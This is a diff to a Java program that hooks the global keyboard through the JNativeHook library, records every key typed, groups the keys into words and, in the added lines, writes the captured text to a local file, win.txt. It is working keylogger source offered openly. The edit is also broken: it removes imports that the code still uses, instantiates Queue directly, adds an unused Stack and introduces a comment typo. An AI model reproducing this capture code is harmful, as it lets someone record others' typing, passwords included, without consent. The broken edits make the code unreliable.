@@ -6,18 +6,20 @@ import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
  * VC_A = means virtual code for A in the library
  * raw-code = asci of the chars
  * */
-import java.util.LinkedList;
-import java.util.Queue;
+import java.io.*;
+import java.util.Stack;
 
 public class Main implements NativeKeyListener {
     static Queue<Character> queue;
     static LinkedList<String> linkedList;
-    static String word;
+    static Stack<String> stack;
+    static StringBuilder word;
 
     Main() {
-        queue = new LinkedList<>();
+        queue = new Queue<>();
         linkedList = new LinkedList<>();
-        word = "";
+        stack = new Stack<>();
+        word = new StringBuilder();
     }
 
     /*
@@ -30,47 +32,12 @@ public class Main implements NativeKeyListener {
      * Short Summary,
      *
      *   keyPressed - when the key goes down
-     *   keyReleased - when the key comes up
+     *   keyReleased - when t key comes up
      *   keyTyped - when the unicode character represented by this key is sent by the keyboard to system input.
      *
      * */
 
     // key code is the virtual code assigned to each special key to generate their words counterpart
-
-    @Override
-    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
-        int keyCode = nativeKeyEvent.getKeyCode();
-//        System.out.println("Keycode is : " + keyCode);
-        if (!(keyCode >= 2 && keyCode <= 11 || keyCode >= 16 && keyCode <= 25
-                || keyCode >= 25 && keyCode <= 38 || keyCode >= 44 && keyCode <= 50))
-            System.out.println("Key Pressed : " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
-
-        // getKeyText is static member of class NativeKeyEvent, so should be called via class name, not via its object
-        // if the pressed key is the space key or enter key, then empty the queue and join the removed elements to word
-        // add that word to our linked list and make word empty
-        if (keyCode == NativeKeyEvent.VC_ENTER || keyCode == NativeKeyEvent.VC_SPACE) {
-            while (!queue.isEmpty()) {
-                word += queue.remove();
-            }
-            linkedList.add(word);
-            System.out.println("Resultant Linked List : " + linkedList);
-            word = "";
-        }
-
-    }
-
-
-    // raw code is the asci of the character being typed
-    @Override
-    public void nativeKeyTyped(NativeKeyEvent e) {
-        if (e.getRawCode() >= 32 && e.getRawCode() <= 127) {
-            // add all typed characters to the queue
-            queue.add(e.getKeyChar());
-            System.out.println("KeyTyped : \"" + e.getKeyChar() + "\" ");
-
-        }
-    }
-
 
     public static void main(String[] args) {
         try {
@@ -80,7 +47,45 @@ public class Main implements NativeKeyListener {
             System.err.println(ex.getMessage());
             System.exit(1);
         }
-
         GlobalScreen.addNativeKeyListener(new Main());
+    }
+
+    @Override
+    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
+        int keyCode = nativeKeyEvent.getKeyCode();
+        // print only when there is a special key
+        if (!(keyCode >= 2 && keyCode <= 11 || keyCode >= 16 && keyCode <= 25 || keyCode >= 30 && keyCode <= 38 || keyCode >= 44 && keyCode <= 50)) {
+            System.out.println("Key Pressed : " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
+            if (keyCode != NativeKeyEvent.VC_SPACE) {
+                for (char c : NativeKeyEvent.getKeyText(keyCode).toCharArray()) {
+                    queue.enqueue(c);
+                }
+            }
+        }
+        if (keyCode == NativeKeyEvent.VC_ENTER || keyCode == NativeKeyEvent.VC_SPACE || keyCode == NativeKeyEvent.VC_PERIOD || keyCode == NativeKeyEvent.VC_BACKSPACE) {
+            while (!queue.isEmpty()) word.append(queue.remove());
+            linkedList.add(word.toString());
+            System.out.println("Resultant Linked List : " + linkedList);
+            writeToFile();
+            word.setLength(0);
+        }
+    }
+
+    // raw code is the asci of the character being typed
+    @Override
+    public void nativeKeyTyped(NativeKeyEvent e) {
+        if (e.getRawCode() >= 27 && e.getRawCode() <= 127) {
+            // add all typed characters to the queue
+            queue.enqueue(e.getKeyChar());
+            System.out.println("KeyTyped : \"" + e.getKeyChar() + "\" ");
+        }
+    }
+
+    void writeToFile() {
+        try (FileWriter fw = new FileWriter(new File(".\\src\\win.txt"), false)) {
+            fw.write(linkedList.toString());
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
     }
 }
